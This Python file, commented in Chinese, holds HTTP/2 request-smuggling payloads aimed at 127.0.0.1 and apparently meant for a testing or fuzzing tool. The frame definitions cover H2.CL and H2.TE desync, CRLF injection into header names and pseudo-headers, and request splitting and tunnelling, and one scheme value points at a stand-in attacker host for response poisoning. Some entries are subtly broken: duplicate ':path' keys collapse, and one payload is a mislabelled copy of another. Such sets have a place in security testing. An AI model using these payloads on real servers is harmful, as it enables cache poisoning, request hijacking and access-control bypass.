

# Request Smuggling
# 再发下一个请求返回400即可
H2_CL_req = {
    "<headers-frame-base-2:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1",
                                 "flags": []},
    "<continuation-frame-base-2:1>": {"content-length": "0", "flags": ["EH"]},
    "<data-frame-base-1:1>": {"data": "GET / HTTP/1.1\r\nHost: 127.0.0.01\r\nContent-Length: 10\r\n\r\nsumggled\r\n", "flags": ["ES"]}}

# 
H2_TE_req = {
    "<headers-frame-base-2:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1",
                                 "flags": []},
    "<continuation-frame-base-2:1>": {"transfer-encoding": "chunked", "flags": ["EH"]},
    "<data-frame-base-1:1>": {"data": "0\r\n\r\nGET / HTTP/1.1\r\nHost: 127.0.0.01\r\nFoo: bar\r\n", "flags": ["ES"]}}

# Response queue poisoning
# 走私一个完整的请求则表示进行响应队列投毒
# CRLF injection
H2_inject_header_name_req = {
    "<headers-frame-base-2:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1",
                                 "flags": []},
    "<continuation-frame-base-2:1>": {"transfer-encoding: chunked\r\nContent-length": "ignore", "flags": ["EH"]},
    "<data-frame-base-1:1>": {"data": "0\r\n\r\nGET / HTTP/1.1\r\nHost: 127.0.0.01\r\n", "flags": ["ES"]}}
H2_inject_pseudo_host_req = {
    "<headers-frame-base-2:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1",
                                 "flags": []},
    "<continuation-frame-base-2:1>": {"transfer-encoding: chunked\r\nContent-length": "ignore", "flags": ["EH"]},
    "<data-frame-base-1:1>": {"data": "0\r\n\r\nGET / HTTP/1.1\r\nHost: 127.0.0.01\r\n", "flags": ["ES"]}}

H2_inject_pseudo_path_req1 = {
    "<headers-frame-base-2:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":path": "/admin",":authority": "127.0.0.1",
                                 "flags": []},
    "<continuation-frame-base-2:1>": {"transfer-encoding: chunked\r\nContent-length": "ignore", "flags": ["EH"]},
    "<data-frame-base-1:1>": {"data": "0\r\n\r\nGET / HTTP/1.1\r\nHost: 127.0.0.01\r\n", "flags": ["ES"]}}

H2_inject_pseudo_path_req2 = {
    "<headers-frame-base-2:1>": {":method": "GET", ":scheme": "https", ":path": "/example HTTP/1.1\r\nTransfer-Encoding: chunked\r\nX:x", ":path": "/admin",":authority": "127.0.0.1",
                                 "flags": ["EH","ES"]}}

H2_inject_pseudo_method_req = {
    "<headers-frame-base-2:1>": {":method": "GET /admin HTTP/1.1", ":scheme": "https", ":path": "/",":authority": "127.0.0.1",
                                 "flags": ["EH","ES"]}}

H2_inject_pseudo_scheme_req = {
    "<headers-frame-base-2:1>": {":method": "GET", ":scheme": "https://evil-user.net/poison?", ":path": "/",":authority": "127.0.0.1",
                                 "flags": ["EH","ES"]}}

# HTTP/2 request splitting
H2_inject_header_block_req = {
    "<headers-frame-base-2:1>": {":method": "GET", ":scheme": "https", ":path": "/",":authority": "127.0.0.1",
                                 "flags": []},
    "<continuation-frame-base-2:1>": {"foo": "bar\r\nHost: 127.0.0.1\r\n\r\nGET / HTTP/1.1", "flags": ["EH","ES"]}}



#HTTP/2 request tunnelling

H2_req_tunnel = {
    "<headers-frame-base-2:1>": {":method": "POST", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1",
                                 "flags": []},
    "<continuation-frame-base-2:1>": {"foo": "bar\r\nContent-Length: 50\r\n\r\ncomment=", "flags": ["EH"]},
    "<data-frame-base-1:1>": {"data": "3\r\nx=1\r\n0\r\n\r\n", "flags": ["ES"]}}

H2_req_tunnel_non_blind = {
    "<headers-frame-base-2:1>": {":method": "HEAD", ":scheme": "https", ":path": "/", ":authority": "127.0.0.1",
                                 "flags": []},
    "<continuation-frame-base-2:1>": {"foo": "bar\r\n\r\nGET /tunnelled HTTP/1.1\r\nHost: 127.0.0.1\r\nX:x", "flags": ["EH","ES"]}}

